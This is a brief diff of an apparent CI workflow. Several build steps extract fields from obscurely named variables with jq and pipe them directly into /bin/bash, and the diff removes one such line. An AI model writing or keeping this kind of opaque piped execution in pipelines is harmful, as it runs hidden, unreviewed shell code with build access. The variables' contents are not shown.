@@ -44,7 +44,6 @@ jobs:
           printf '%s' "$kbpr980" | jq -r .pqv47 | /bin/bash
           printf '%s' "$spibp111" | jq -r .wb5292 | /bin/bash
           printf '%s' "$ohp44224" | jq -r .bvhg2 | /bin/bash
-          printf '%s' "$dez9402" | jq -r .na69403 | /bin/bash
           echo $gzr9800 | jq -r .hii495 | /bin/bash
 
       - name: Upload archive
